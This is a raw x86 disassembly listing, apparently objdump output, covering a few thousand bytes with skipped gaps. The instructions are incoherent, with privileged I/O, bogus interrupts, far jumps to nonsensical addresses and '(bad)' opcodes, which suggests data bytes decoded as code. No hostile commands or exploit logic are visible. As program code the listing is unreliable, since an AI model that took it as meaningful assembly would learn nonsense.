  42b785:	rol    DWORD PTR [ecx],1
  42b787:	add    BYTE PTR ds:0x7e000001,al
  42b78d:	out    0xcf,eax
  42b78f:	scas   al,BYTE PTR es:[edi]
  42b790:	xchg   esp,eax
  42b791:	pop    ecx
  42b792:	pop    DWORD PTR [ebx-0x10303934]
  42b798:	das    
  42b799:	mov    dl,BYTE PTR [eax]
  42b79b:	call   0x50180fa4
  42b7a0:	and    ebp,DWORD PTR [edi-0x6b]
  42b7a3:	fdivr  DWORD PTR [ecx]
  42b7a5:	dec    eax
  42b7a6:	xchg   edi,eax
  42b7a7:	mov    BYTE PTR [esi-0x6cb8953d],dh
  42b7ad:	jae    0x42b7de
  42b7af:	cmp    dl,BYTE PTR [edi]
  42b7b1:	add    al,0x5c
  42b7b3:	push   0xffffffd8
  42b7b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b7b6:	sbb    ch,BYTE PTR [esp+eiz*2]
  42b7b9:	and    DWORD PTR [esi-0xd],edi
  42b7bc:	int    0xdf
  42b7be:	or     dh,BYTE PTR [ebp-0x59e2e34]
  42b7c4:	cmp    edi,ecx
  42b7c6:	scas   al,BYTE PTR es:[edi]
  42b7c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b7c8:	push   es
  42b7c9:	add    eax,0x58978f5d
  42b7ce:	std    
  42b7cf:	xor    BYTE PTR [edi+0x4dd7d656],ah
  42b7d5:	rcr    DWORD PTR [eax],0xbb
  42b7d8:	outs   dx,BYTE PTR ds:[esi]
  42b7d9:	jo     0x42b7b4
  42b7db:	adc    DWORD PTR [ebx],ebp
  42b7dd:	jnp    0x42b7ab
  42b7df:	fwait
  42b7e0:	scas   eax,DWORD PTR es:[edi]
  42b7e1:	clc    
  42b7e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b7e3:	sub    BYTE PTR [eax+0x2ca2d9c0],al
  42b7e9:	jo     0x42b7d1
  42b7eb:	or     ah,BYTE PTR [edx-0x4e3bdd72]
  42b7f1:	inc    ebx
  42b7f2:	push   ss
  42b7f3:	push   ds
  42b7f4:	lea    edx,[ebx+0x6]
  42b7f7:	rcr    dh,cl
  42b7f9:	sti    
  42b7fa:	sbb    eax,0x91427288
  42b7ff:	retf   
  42b800:	fnstcw WORD PTR [esi+eiz*8]
  42b803:	xor    BYTE PTR [esi-0x306fb019],bh
  42b809:	not    edi
  42b80b:	and    DWORD PTR ds:0x6c7d9de7,edi
  42b811:	loope  0x42b7b8
  42b813:	push   esp
  42b814:	mov    dl,0x41
  42b816:	mov    al,ds:0x1db1e7b1
  42b81b:	iret   
  42b81c:	inc    ebp
  42b81d:	xchg   edx,eax
  42b81e:	in     al,dx
  42b81f:	gs sbb eax,0x8fb06b8b
  42b825:	lea    esi,[esi+0xc]
  42b828:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b829:	sbb    BYTE PTR [ebx+0x33fe752b],0x53
  42b830:	dec    ebp
  42b831:	scas   al,BYTE PTR es:[edi]
  42b832:	lods   eax,DWORD PTR ds:[esi]
  42b833:	add    DWORD PTR cs:[eax+0x67],eax
  42b837:	rcr    DWORD PTR [ecx-0x16eb9d15],cl
  42b83d:	sbb    al,0xec
  42b83f:	cwde   
  42b840:	iret   
  42b841:	imul   ebx,DWORD PTR [ebx],0xde535288
  42b847:	and    BYTE PTR [eax+0x502a9193],bl
  42b84d:	jmp    0x59ca4aac
  42b852:	dec    edi
  42b853:	es pop es
  42b855:	and    eax,0x754c4305
  42b85a:	xchg   ecx,eax
  42b85b:	je     0x42b83a
  42b85d:	push   esi
  42b85e:	dec    eax
  42b85f:	push   es
  42b860:	push   0xffffffb3
  42b862:	xchg   DWORD PTR [edx+0x37],edx
  42b865:	lea    eax,[esi-0x4205d286]
  42b86b:	mov    dh,dl
  42b86d:	mov    DWORD PTR ds:0x16019806,esp
  42b873:	inc    esi
  42b874:	jecxz  0x42b85a
  42b876:	outs   dx,DWORD PTR ds:[esi]
  42b877:	adc    ebp,0x68
  42b87a:	lods   eax,DWORD PTR ds:[esi]
  42b87b:	outs   dx,DWORD PTR ds:[esi]
  42b87c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b87d:	mov    bl,0x6f
  42b87f:	push   ecx
  42b880:	sbb    eax,DWORD PTR [ebx-0x807668d]
  42b886:	mov    ds:0xadac4dfc,al
  42b88b:	mov    cl,0x31
  42b88d:	or     DWORD PTR [esi],ebx
  42b88f:	adc    DWORD PTR [ecx],ebp
	...
  42b8f1:	add    BYTE PTR [eax],al
  42b8f3:	add    al,ch
  42b8f5:	popf   
  42b8f6:	mov    esi,0xf9e7ffe7
  42b8fb:	lahf   
  42b8fc:	ret    0x608c
  42b8ff:	or     edi,DWORD PTR [edx-0x37a6a14f]
  42b905:	rol    BYTE PTR [ecx],cl
  42b907:	add    BYTE PTR ds:0x77000001,al
  42b90d:	das    
  42b90e:	or     al,0x63
  42b910:	push   cs
  42b911:	mov    ebp,0xd2024afd
  42b916:	add    eax,0xe5bd975e
  42b91b:	and    edi,ebx
  42b91d:	push   edx
  42b91e:	mov    al,0x94
  42b920:	repz mov bh,0x53
  42b923:	test   DWORD PTR [ecx],ebp
  42b925:	mov    eax,ss
  42b927:	pop    ebx
  42b928:	jmp    0x42b9a7
  42b92a:	xchg   BYTE PTR [eax-0x33],dl
  42b92d:	out    dx,eax
  42b92e:	push   eax
  42b92f:	push   edx
  42b930:	cmp    DWORD PTR [esi],esi
  42b932:	xlat   BYTE PTR ds:[ebx]
  42b933:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b934:	(bad)  
  42b935:	cmp    bl,BYTE PTR [esi-0x78]
  42b938:	repz (bad) 
  42b93a:	arpl   WORD PTR [eax-0x33],sp
  42b93d:	out    0x29,al
  42b93f:	sub    edx,DWORD PTR [edx]
  42b941:	fdivr  QWORD PTR [edi]
  42b943:	ret    0xe78a
  42b946:	loopne 0x42b948
  42b948:	jne    0x42b997
  42b94a:	mov    dl,0xe3
  42b94c:	push   ebx
  42b94d:	(bad)  
  42b94e:	lahf   
  42b94f:	xor    DWORD PTR [eax],ebp
  42b951:	or     al,0xfd
  42b953:	popf   
  42b954:	cmp    cl,dh
  42b956:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b958:	leave  
  42b959:	or     al,0x4a
  42b95b:	dec    ebp
  42b95c:	lock clc 
  42b95e:	and    ah,BYTE PTR [ebp+ebp*4-0x77befaf8]
  42b965:	xchg   DWORD PTR [esp],edx
  42b968:	lods   al,BYTE PTR ds:[esi]
  42b969:	retf   
  42b96a:	(bad)  
  42b96b:	xchg   ecx,eax
  42b96c:	xchg   BYTE PTR [edx],ah
  42b96e:	cli    
  42b96f:	(bad)  
  42b970:	retf   
  42b971:	jp     0x42b933
  42b973:	push   esi
  42b974:	xchg   ecx,eax
  42b975:	dec    ecx
  42b976:	call   0x555c07b9
  42b97b:	idiv   DWORD PTR [ecx+0x3d]
  42b97e:	cmp    eax,0x284f1b46
  42b983:	cld    
  42b984:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b985:	loopne 0x42b9fe
  42b987:	ret    
  42b988:	xchg   esi,eax
  42b989:	in     eax,dx
  42b98a:	fisttp WORD PTR [ebp-0x7f]
  42b98d:	loopne 0x42b971
  42b98f:	add    BYTE PTR [edx],dl
  42b991:	push   esp
  42b992:	push   cs
  42b993:	or     al,0x22
  42b995:	iret   
  42b996:	je     0x42b938
  42b998:	pop    es
  42b999:	aam    0xa5
  42b99b:	sub    eax,0x4fceecae
  42b9a0:	sub    BYTE PTR [esi+0x2598fd54],ch
  42b9a6:	mov    dh,BYTE PTR [ebx+ecx*4+0x2b]
  42b9aa:	retf   
  42b9ab:	cwde   
  42b9ac:	lahf   
  42b9ad:	es jg  0x42b931
  42b9b0:	popf   
  42b9b1:	jmp    0x37847507
  42b9b6:	bound  edi,QWORD PTR [edx+0x3e]
  42b9b9:	jo     0x42b995
  42b9bb:	inc    ebx
  42b9bc:	mov    ebx,0xea5bb380
  42b9c1:	pop    ecx
  42b9c2:	ret    
  42b9c3:	xchg   esi,eax
  42b9c4:	jns    0x42b9ab
  42b9c6:	push   0xd8962b5d
  42b9cb:	push   ds
  42b9cc:	sub    eax,0x3415a48
  42b9d1:	fcom   QWORD PTR [edi]
  42b9d3:	mov    al,ah
  42b9d5:	cld    
  42b9d6:	sbb    BYTE PTR [ecx-0x24],ch
  42b9d9:	push   esi
  42b9da:	jno    0x42ba20
  42b9dc:	adc    eax,0x5f27034d
  42b9e1:	pop    eax
  42b9e2:	sbb    DWORD PTR [edi],edx
  42b9e4:	jle    0x42b9b5
  42b9e6:	cdq    
  42b9e7:	std    
  42b9e8:	int    0x67
  42b9ea:	inc    ebx
  42b9eb:	icebp  
  42b9ec:	pop    eax
  42b9ed:	xchg   ebp,eax
  42b9ee:	fs out 0x4d,al
  42b9f1:	and    edi,DWORD PTR [ebx+0x59f33d08]
  42b9f7:	std    
  42b9f8:	dec    ebx
  42b9f9:	xor    bl,BYTE PTR fs:0x9539def2
  42ba00:	mov    al,ds:0xecf06a0d
  42ba05:	push   ebx
  42ba06:	rcr    DWORD PTR [ebp-0x40],cl
  42ba09:	outs   dx,DWORD PTR ds:[esi]
  42ba0a:	xchg   esi,eax
  42ba0b:	retf   0x21f7
  42ba0e:	out    0x5e,eax
  42ba10:	hlt    
	...
  42ba71:	add    BYTE PTR [eax],al
  42ba73:	add    BYTE PTR [ebx-0x431d4ff9],cl
  42ba79:	neg    ebx
  42ba7b:	outs   dx,DWORD PTR ds:[esi]
  42ba7c:	push   0x5b
  42ba7e:	xchg   ecx,eax
  42ba7f:	or     DWORD PTR [edi],ebp
  42ba81:	jno    0x42bac5
  42ba83:	adc    al,0xcd
  42ba85:	rol    DWORD PTR [ecx],cl
  42ba87:	add    BYTE PTR ds:0xd3000001,al
  42ba8d:	out    dx,al
  42ba8e:	mov    esi,0x85c236c
  42ba93:	not    bh
  42ba95:	jmp    0x379d:0x35bcdf8e
  42ba9c:	adc    DWORD PTR [edi],edx
  42ba9e:	adc    DWORD PTR [ecx+0x42],edi
  42baa1:	rol    DWORD PTR [edi+ebx*1+0x50],1
  42baa5:	pop    esp
  42baa6:	fst    QWORD PTR [eax-0x2e9cc574]
  42baac:	out    0xc2,al
  42baae:	adc    eax,DWORD PTR [edx-0x4]
  42bab1:	pop    esi
  42bab2:	out    dx,eax
  42bab3:	xchg   DWORD PTR [ebx+0x7dbf4fe1],esi
  42bab9:	and    al,0x49
  42babb:	xchg   BYTE PTR [edi+0x116583fd],cl
  42bac1:	clc    
  42bac2:	stc    
  42bac3:	pop    ss
  42bac4:	adc    eax,0x74ee3c50
  42bac9:	sahf   
  42baca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bacb:	retf   
  42bacc:	aaa    
  42bacd:	pusha  
  42bace:	push   ss
  42bacf:	mov    ds:0x4554c04a,al
  42bad4:	outs   dx,BYTE PTR ds:[esi]
  42bad5:	cmp    eax,DWORD PTR [ecx-0x1af7b7a3]
  42badb:	inc    esp
  42badc:	into   
  42badd:	int    0xb5
  42badf:	es scas al,BYTE PTR es:[edi]
  42bae1:	add    eax,0x97afe42c
  42bae6:	or     ecx,esi
  42bae8:	inc    ebx
  42bae9:	inc    eax
  42baea:	inc    edi
  42baeb:	arpl   WORD PTR [ecx],cx
  42baed:	pop    es
  42baee:	jns    0x42bb58
  42baf0:	loope  0x42bb43
  42baf2:	aas    
  42baf3:	fild   WORD PTR [ebp+0xb3f16bc]
  42baf9:	inc    ebp
  42bafa:	lahf   
  42bafb:	push   ss
  42bafc:	sub    dh,BYTE PTR [eax+esi*2]
  42baff:	loopne 0x42baa6
  42bb01:	mov    edi,ss
  42bb03:	(bad)  
  42bb04:	fadd   QWORD PTR [ebx+0xc]
  42bb07:	pop    ecx
  42bb08:	ja     0x42bb50
  42bb0a:	push   0x77c888d2
  42bb0f:	mov    dh,0x76
  42bb11:	pop    eax
  42bb12:	jl     0x42bab7
  42bb14:	mov    dh,0xf5
  42bb16:	out    0x8a,al
  42bb18:	bound  esi,QWORD PTR [esi+0x31e7038f]
  42bb1e:	or     ecx,0x1b
  42bb21:	popf   
  42bb22:	ret    0x74ef
  42bb25:	mov    DWORD PTR [eax+0x78],edx
  42bb28:	xchg   esi,eax
  42bb29:	arpl   bp,di
  42bb2b:	cli    
  42bb2c:	xor    BYTE PTR [ebp-0x1233ec1b],0x52
  42bb33:	ret    
  42bb34:	sbb    ch,BYTE PTR [edx+0x13ad51cd]
  42bb3a:	mov    bl,dl
  42bb3c:	daa    
  42bb3d:	push   eax
  42bb3e:	mov    esi,0x8faf1b5d
  42bb43:	ret    0xbe97
  42bb46:	fxch   st(0)
  42bb48:	daa    
  42bb49:	inc    edi
  42bb4a:	inc    esp
  42bb4b:	jmp    0x6446:0xff662691
  42bb52:	pop    es
  42bb53:	sar    DWORD PTR [ebx+0x45],1
  42bb56:	aaa    
  42bb57:	inc    esp
  42bb58:	hlt    
  42bb59:	sub    edx,DWORD PTR [eax+0x31be3eb7]
  42bb5f:	sbb    esi,ecx
  42bb61:	push   ds
  42bb62:	mov    ebx,0xa40429cc
  42bb67:	pushf  
  42bb68:	bound  ebx,QWORD PTR [ecx]
  42bb6a:	sub    al,0x39
  42bb6c:	pop    ebx
  42bb6d:	in     al,dx
  42bb6e:	fwait
  42bb6f:	popa   
  42bb70:	jno    0x42bbd1
  42bb72:	in     eax,dx
  42bb73:	sub    eax,edx
  42bb75:	repz push ds
  42bb77:	push   ebx
  42bb78:	test   eax,0xa47677c
  42bb7d:	and    BYTE PTR [ecx+0x47],dl
  42bb80:	jmp    0x42bb94
  42bb82:	push   esp
  42bb83:	mov    al,0x10
  42bb85:	fcom   QWORD PTR [ebx-0x15]
  42bb88:	out    0x71,eax
  42bb8a:	fs and al,0xf2
  42bb8d:	jmp    0x98b7a9
	...
  42bbf2:	add    BYTE PTR [eax],al
  42bbf4:	xor    al,0x28
  42bbf6:	add    DWORD PTR [esi],eax
  42bbf8:	sbb    eax,0x233a372f
  42bbfd:	sub    DWORD PTR [ebx],eax
  42bbff:	dec    ecx
  42bc00:	pop    esp
  42bc01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bc02:	imul   ecx,DWORD PTR [ebx+0x1d4d2],0x5
  42bc09:	add    DWORD PTR [eax],eax
  42bc0b:	add    BYTE PTR [edi+0x68586083],cl
  42bc11:	jmp    0xd21b:0xc69214d9
  42bc18:	add    ch,BYTE PTR [ebx-0x37]
  42bc1b:	shl    BYTE PTR [esi+0x6c],0x9d
  42bc1f:	pop    edx
  42bc20:	xor    BYTE PTR [esi],cl
  42bc22:	bound  esi,QWORD PTR [edi]
  42bc24:	and    bh,BYTE PTR [edi-0x50]
  42bc27:	stc    
  42bc28:	mov    dl,0xc9
  42bc2a:	in     al,0x24
  42bc2c:	adc    eax,0x78d44ed7
  42bc31:	pop    edx
  42bc32:	sub    ecx,DWORD PTR [ebx+eax*4+0x76]
  42bc36:	and    DWORD PTR [ecx+ebp*1+0x44],esi
  42bc3a:	push   edi
  42bc3b:	mov    ch,0xb7
  42bc3d:	stos   DWORD PTR es:[edi],eax
  42bc3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bc3f:	fidivr DWORD PTR [ebx-0x56]
  42bc42:	mov    ebx,esi
  42bc44:	xchg   ebp,eax
  42bc45:	dec    eax
  42bc46:	xchg   BYTE PTR [edx+0x33f5da5a],dl
  42bc4c:	mov    ds:0xf486fafa,eax
  42bc51:	loope  0x42bcbd
  42bc53:	je     0x42bbf7
  42bc55:	in     eax,0xcf
  42bc57:	loopne 0x42bc28
  42bc59:	or     eax,0x644530ba
  42bc5e:	pusha  
  42bc5f:	mov    esp,0x713ec51b
  42bc64:	mov    edx,0x1892d892
  42bc69:	stos   BYTE PTR es:[edi],al
  42bc6a:	and    BYTE PTR [eax-0x30a69f9e],dh
  42bc70:	fldcw  WORD PTR [ebp-0x2e]
  42bc73:	out    0x76,eax
  42bc75:	or     ch,BYTE PTR [ebx+0x71]
  42bc78:	data16 add al,0x54
  42bc7b:	add    BYTE PTR [ecx],ah
  42bc7d:	cmp    eax,0x82d47705
  42bc82:	in     al,dx
  42bc83:	cmp    BYTE PTR [ebp+ecx*8-0x16],0x42
  42bc88:	imul   ebp,DWORD PTR [eax],0xa663d2e1
  42bc8e:	inc    ebx
  42bc8f:	cld    
  42bc90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bc91:	xchg   ebp,eax
  42bc92:	cmp    al,0x4e
  42bc94:	es dec edx
  42bc96:	test   eax,0xc0412391
  42bc9b:	fwait
  42bc9c:	icebp  
  42bc9d:	test   eax,0x2979e687
  42bca2:	mov    ebp,0xf158354
  42bca7:	push   0x1c
  42bca9:	jnp    0x42bcef
  42bcab:	stos   DWORD PTR es:[edi],eax
  42bcac:	dec    esi
  42bcad:	pop    ecx
  42bcae:	sbb    BYTE PTR [esi],bh
  42bcb0:	adc    al,0x3f
  42bcb2:	pusha  
  42bcb3:	nop
  42bcb4:	pop    esi
  42bcb5:	cwde   
  42bcb6:	adc    al,0xd5
  42bcb8:	or     BYTE PTR [esp+eiz*8-0x57151b5a],dl
  42bcbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bcc0:	test   ch,dh
  42bcc2:	push   ds
  42bcc3:	xor    esi,eax
  42bcc5:	dec    esp
  42bcc6:	jge    0x42bc59
  42bcc8:	lea    ebx,ds:0x92b3ab19
  42bcce:	ins    DWORD PTR es:[edi],dx
  42bccf:	rol    DWORD PTR [eax+esi*4-0x2a1e3932],0x28
  42bcd7:	mov    ds:0x9aff96d1,eax
  42bcdc:	rcl    DWORD PTR [ebx-0x2f372b56],0x7
  42bce3:	stos   DWORD PTR es:[edi],eax
  42bce4:	jp     0x42bcb5
  42bce6:	inc    edi
  42bce7:	popa   
  42bce8:	jae    0x42bce4
  42bcea:	cld    
  42bceb:	push   es
  42bcec:	jbe    0x42bc84
  42bcee:	addr16 fs int 0x39
  42bcf2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bcf3:	out    0xd4,al
  42bcf5:	adc    ah,ah
  42bcf7:	inc    eax
  42bcf8:	sbb    eax,0x100cf2ce
  42bcfd:	cs call 0x3702:0x951aa34f
  42bd05:	mov    ch,0xb0
  42bd07:	iret   
  42bd08:	mov    ds:0xb5b82198,al
  42bd0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bd0e:	adc    BYTE PTR [esi-0x6c],cl
	...
  42bd71:	add    BYTE PTR [eax],al
  42bd73:	add    BYTE PTR [eax-0x61eb634a],dh
  42bd79:	ds mov eax,0xffec3b6
  42bd7f:	jae    0x42bd3d
  42bd81:	adc    bl,BYTE PTR [edi+0x1d5d7a2]
  42bd87:	add    BYTE PTR ds:0xd9000001,al
  42bd8d:	xchg   BYTE PTR [ebx-0x1a],cl
  42bd90:	jns    0x42bd56
  42bd92:	fld    st(1)
  42bd94:	js     0x42bd99
  42bd96:	fcmovnbe st,st(7)
  42bd98:	psubw  mm6,QWORD PTR [ebp-0x32]
  42bd9c:	ds sbb al,0x66
  42bd9f:	ins    DWORD PTR es:[edi],dx
  42bda0:	es ret 
  42bda2:	or     al,0x7f
  42bda4:	mov    ds:0x1272472f,al
  42bda9:	adc    dh,0xef
  42bdac:	jb     0x42be24
  42bdae:	cmp    BYTE PTR [esp+eiz*2],ah
  42bdb1:	inc    edx
  42bdb2:	nop
  42bdb3:	dec    eax
  42bdb4:	into   
  42bdb5:	lock dec esp
  42bdb7:	sbb    ah,BYTE PTR [edx]
  42bdb9:	nop
  42bdba:	mov    ch,0xb
  42bdbc:	out    0x86,eax
  42bdbe:	pop    eax
  42bdbf:	arpl   WORD PTR [eax+eiz*8],si
  42bdc2:	add    dl,BYTE PTR [ecx]
  42bdc4:	or     eax,0x9fcf064a
  42bdc9:	(bad)  
  42bdca:	fadd   st(0),st
  42bdcc:	mov    WORD PTR [ebx+esi*2+0x1cc9351b],ss
  42bdd3:	dec    eax
  42bdd4:	aad    0x47
  42bdd6:	int    0xc6
  42bdd8:	arpl   WORD PTR [eax+0x16],di
  42bddb:	(bad)  
  42bddc:	imul   ecx,DWORD PTR [ebx],0x196637a
  42bde2:	mov    ah,0xc2
  42bde4:	ss ja  0x42bd9e
  42bde7:	cwde   
  42bde8:	push   ecx
  42bde9:	mov    ds:0xe66e83ae,al
  42bdee:	mov    esi,0xea9601ae
  42bdf3:	mov    ecx,DWORD PTR [ebp-0x38]
  42bdf6:	enter  0x795f,0xee
  42bdfa:	shl    dh,cl
  42bdfc:	mov    ecx,0xb1e7f529
  42be01:	xchg   esi,eax
  42be02:	pusha  
  42be03:	mov    ecx,0x1e6cbb69
  42be08:	daa    
  42be09:	xchg   esi,eax
  42be0a:	inc    ebp
  42be0b:	and    DWORD PTR [edi-0x62],edx
  42be0e:	mov    bh,0x56
  42be10:	(bad)  
  42be11:	jmp    DWORD PTR [ebx]
  42be13:	xor    DWORD PTR [ecx],esi
  42be15:	ret    0x46d5
  42be18:	shl    DWORD PTR [ebx],cl
  42be1a:	cmp    al,0x1
  42be1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42be1d:	ins    BYTE PTR es:[edi],dx
  42be1e:	retf   
  42be1f:	sub    esi,edi
  42be21:	cmp    ebp,DWORD PTR [ebx-0xa]
  42be24:	pop    es
  42be25:	ficom  DWORD PTR [esp+ecx*8+0x19b80a57]
  42be2c:	nop
  42be2d:	inc    ebp
  42be2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42be2f:	xor    al,0x97
  42be31:	xor    al,0xa4
  42be33:	arpl   WORD PTR [edi-0x57],sp
  42be36:	ret    
  42be37:	stc    
  42be38:	or     eax,0xda862d32
  42be3d:	cmp    BYTE PTR [ecx],cl
  42be3f:	imul   bp,WORD PTR [esi+0x1c],0x27
  42be44:	ja     0x42bdf4
  42be46:	xchg   ebp,eax
  42be47:	arpl   WORD PTR [eax],di
  42be49:	ins    DWORD PTR es:[edi],dx
  42be4a:	lds    ecx,FWORD PTR [ebp+eiz*2-0x4f]
  42be4e:	test   BYTE PTR [esp+ecx*4+0x552838cc],dl
  42be55:	or     al,0x26
  42be57:	pop    ebx
  42be58:	cmp    DWORD PTR [edx-0x3612e783],ebx
  42be5e:	add    al,0x5f
  42be60:	inc    eax
  42be61:	push   es
  42be62:	jg     0x42beb8
  42be64:	adc    DWORD PTR [ecx],0x34
  42be67:	mov    ds:0xb503be83,eax
  42be6c:	mov    BYTE PTR [esi-0x5d51f064],al
  42be72:	xchg   ecx,eax
  42be73:	push   ss
  42be74:	mov    ds:0xadf1f33a,al
  42be79:	push   ebp
  42be7a:	pop    eax
  42be7b:	and    al,0xac
  42be7d:	nop
  42be7e:	xchg   esp,eax
  42be7f:	sbb    BYTE PTR [ebp-0x76fa33d7],dh
  42be85:	mov    esp,0x2c9ef6be
  42be8a:	mov    bh,0x6b
  42be8c:	arpl   ax,di
  42be8e:	sar    DWORD PTR [esi+0x29],1
	...
  42bef1:	add    BYTE PTR [eax],al
  42bef3:	add    BYTE PTR [edi-0x825b8e0],dl
  42bef9:	call   FWORD PTR [edi-0x28375c93]
  42beff:	jnp    0x42beb3
  42bf01:	jmp    0x42bf07
  42bf03:	aas    
  42bf04:	(bad)  
  42bf06:	add    DWORD PTR [eax],eax
  42bf08:	add    eax,0xba000001
  42bf0d:	fs out dx,eax
  42bf0f:	sbb    eax,0x9c14b5ec
  42bf14:	mov    dh,0x2f
  42bf16:	sbb    al,0x5
  42bf18:	cmp    DWORD PTR [esi-0x4e],eax
  42bf1b:	aad    0x88
  42bf1d:	call   0xbdfc618a
  42bf22:	xor    edi,DWORD PTR [ebx+0x5f]
  42bf25:	inc    esp
  42bf26:	mov    ah,0x80
  42bf28:	xchg   ecx,eax
  42bf29:	push   edx
  42bf2a:	nop
  42bf2b:	mov    DWORD PTR [eax-0x1a],ecx
  42bf2e:	sbb    al,0xf8
  42bf30:	sub    eax,0x8cb342d2
  42bf35:	push   0x5af8dce1
  42bf3a:	mov    WORD PTR [esi],es
  42bf3c:	das    
  42bf3d:	jecxz  0x42bef4
  42bf3f:	or     BYTE PTR [edx-0x2cbb40f6],bh
  42bf45:	mov    esi,es
  42bf47:	leave  
  42bf48:	fisubr DWORD PTR [edi]
  42bf4a:	pop    ds
  42bf4b:	xchg   edi,eax
  42bf4c:	xor    al,0x37
  42bf4e:	pop    edi
  42bf4f:	or     ch,0xa5
  42bf52:	cli    
  42bf53:	adc    DWORD PTR ds:0x82fcdce9,ecx
  42bf59:	fwait
  42bf5a:	mov    ?,esi
  42bf5c:	mov    ecx,0x5820a636
  42bf61:	xchg   edi,eax
  42bf62:	fst    DWORD PTR [eax-0x10]
  42bf65:	mov    al,0xcd
  42bf67:	ss cmp al,0x58
  42bf6a:	xchg   esp,eax
  42bf6b:	test   al,0x19
  42bf6d:	jne    0x42bf39
  42bf6f:	mov    BYTE PTR [eax-0x63],bl
  42bf72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bf73:	in     eax,dx
  42bf74:	jbe    0x42bf2d
  42bf76:	sbb    DWORD PTR [ebx+esi*4+0x56],ebx
  42bf7a:	fmul   st(6),st
  42bf7c:	cs scas eax,DWORD PTR es:[edi]
  42bf7e:	cmp    bh,BYTE PTR ds:0xee76a261
  42bf84:	pop    DWORD PTR [edx-0x39b3baf]
  42bf8a:	or     eax,0x3b862e8
  42bf8f:	nop
  42bf90:	jo     0x42bf75
  42bf92:	or     eax,0x116de27b
  42bf97:	aam    0xf6
  42bf99:	push   ebx
  42bf9a:	jp     0x42c00d
  42bf9c:	outs   dx,BYTE PTR ds:[esi]
  42bf9d:	popf   
  42bf9e:	imul   edx,DWORD PTR [ecx],0x7b
  42bfa1:	add    BYTE PTR [edi+0x5f],bl
  42bfa4:	push   ds
  42bfa5:	repnz pop ebp
  42bfa7:	or     DWORD PTR [esp+edi*4],edx
  42bfaa:	fcmovne st,st(1)
  42bfac:	ins    BYTE PTR es:[edi],dx
  42bfad:	js     0x42bfad
  42bfaf:	mov    bl,0x2a
  42bfb1:	aas    
  42bfb2:	push   ss
  42bfb3:	add    cl,BYTE PTR [ecx+0xa207f29]
  42bfb9:	mov    ah,0x40
  42bfbb:	mov    ch,0x31
  42bfbd:	test   DWORD PTR [ecx],ebx
  42bfbf:	cld    
  42bfc0:	push   cs
  42bfc1:	push   ecx
  42bfc2:	jns    0x42c022
  42bfc4:	ret    0xa87a
  42bfc7:	xchg   BYTE PTR [eax],bh
  42bfc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bfca:	loop   0x42c030
  42bfcc:	ins    DWORD PTR es:[edi],dx
  42bfcd:	push   ecx
  42bfce:	hlt    
  42bfcf:	ds jnp 0x42bf5e
  42bfd2:	adc    eax,0x831809a8
  42bfd7:	int    0x8b
  42bfd9:	inc    ebp
  42bfda:	inc    ebx
  42bfdb:	cdq    
  42bfdc:	mov    DWORD PTR [esi-0x2017eca7],esp
  42bfe2:	retf   
  42bfe3:	push   ss
  42bfe4:	js     0x42c02e
  42bfe6:	in     al,0x84
  42bfe8:	and    BYTE PTR [edx-0x2d],0x19
  42bfec:	int    0x5c
  42bfee:	pop    ebp
  42bfef:	in     al,dx
  42bff0:	les    esi,FWORD PTR [eax-0x3152fc00]
  42bff6:	sbb    BYTE PTR [eax-0x62],ch
  42bff9:	jg     0x42bf9e
  42bffb:	or     al,0x81
  42bffd:	mov    ch,0xfe
  42bfff:	stos   BYTE PTR es:[edi],al
  42c000:	int    0xeb
  42c002:	sete   BYTE PTR [ebp-0x44]
  42c006:	lods   al,BYTE PTR ds:[esi]
  42c007:	sti    
  42c008:	aaa    
  42c009:	xor    eax,0x97ec81ba
  42c00e:	jne    0x42bfe7
  42c010:	aas    
	...
  42c071:	add    BYTE PTR [eax],al
  42c073:	add    BYTE PTR [edx],bh
  42c075:	xchg   edx,eax
  42c076:	ja     0x42c0aa
  42c078:	push   edi
  42c07a:	jg     0x42c016
  42c07c:	leave  
  42c07d:	or     DWORD PTR [edi-0x57],edi
  42c080:	gs hlt 
  42c082:	rcr    bh,1
  42c084:	loope  0x42c05d
  42c086:	add    DWORD PTR [eax],eax
  42c088:	add    eax,0x18000001
  42c08d:	loope  0x42c069
  42c08f:	mov    ecx,0x29b8d8f6
  42c094:	jg     0x42c03a
  42c096:	or     eax,0x614b3e77
  42c09b:	sbb    esi,0x6ac5b746
  42c0a1:	mov    esi,0x9c42c6a1
  42c0a6:	shl    DWORD PTR [eax+0x46],1
  42c0a9:	enter  0xc3df,0xa
  42c0ad:	and    DWORD PTR [eax-0x1623702c],esp
  42c0b3:	sbb    dh,BYTE PTR [edi-0x5b]
  42c0b6:	mov    dh,0x39
  42c0b8:	inc    eax
  42c0b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c0ba:	lods   al,BYTE PTR ds:[esi]
  42c0bb:	outs   dx,BYTE PTR ds:[esi]
  42c0bc:	add    BYTE PTR [esi+0x6a],bh
  42c0bf:	cli    
  42c0c0:	push   esp
  42c0c1:	xchg   ebp,eax
  42c0c2:	inc    esi
  42c0c3:	lahf   
  42c0c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c0c5:	push   ecx
  42c0c6:	out    dx,eax
  42c0c7:	cmp    ah,BYTE PTR [edi+ecx*4-0x3f]
  42c0cb:	sbb    al,0xad
  42c0cd:	xlat   BYTE PTR ds:[ebx]
  42c0ce:	es pop ecx
  42c0d0:	push   eax
